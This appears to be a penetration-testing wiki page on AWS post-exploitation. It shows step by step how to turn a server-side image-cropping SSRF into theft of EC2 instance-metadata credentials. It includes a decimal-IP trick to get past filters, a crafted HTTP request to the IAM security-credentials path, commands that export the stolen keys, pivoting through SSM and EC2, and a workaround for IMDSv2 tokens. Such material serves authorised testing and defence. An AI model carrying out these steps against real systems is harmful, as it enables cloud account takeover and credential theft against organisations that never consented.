# AWS - Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## IMDS credential theft via attacker-readable SSRF sinks

A server-side image crop/resize/downloader that accepts a user-controlled URL and writes the fetched **raw response bytes** into a user-accessible location (for example, returning the public S3 key of the processed "image") turns SSRF into a **non-blind exfil channel**:

1. **Confirm data exfil**: Point the SSRF to an external site (e.g., `//example.com`). Download the generated object and read the body to verify the backend stored the HTTP response.
2. **Target IMDS**: If `169.254.169.254` is filtered, try alternate encodings (decimal often bypasses naive filters). IPv4 to decimal example:
   ```bash
   python3 - <<'PY'
import ipaddress
print(int(ipaddress.IPv4Address('169.254.169.254')))
PY
   # 2852039166
   ```
3. **Request role credentials** via the SSRF using the decimal IP:
   ```http
   POST /profile/crop-image HTTP/2
   Content-Type: application/x-www-form-urlencoded

   path=http://2852039166/latest/meta-data/iam/security-credentials/<role>&X=50&Y=50&Width=150&Height=150
   ```
4. **Download the produced object** (the "cropped image") and read the embedded JSON credentials. Export them to your tooling:
   ```bash
   export AWS_ACCESS_KEY_ID=<AccessKeyId>
   export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
   export AWS_SESSION_TOKEN=<Token>
   aws sts get-caller-identity
   ```
5. **Pivot with the stolen role**: enumerate (`aws ec2 describe-instances`, `aws iam list-attached-role-policies`) and, if allowed, use management-plane actions for execution (e.g., `aws ssm send-command`, `aws ssm start-session`, `aws ec2 associate-iam-instance-profile` on targets).

> [!NOTE]
> If IMDSv2 is enforced, add the token exchange step through the SSRF (`PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`) and replay the returned token in subsequent metadata requests.

## References

- [Compromising a NASDAQ Financial Giant](https://estse.github.io/posts/compromising-a-nasdaq-financial-giant/)

{{#include ../../../banners/hacktricks-training.md}}
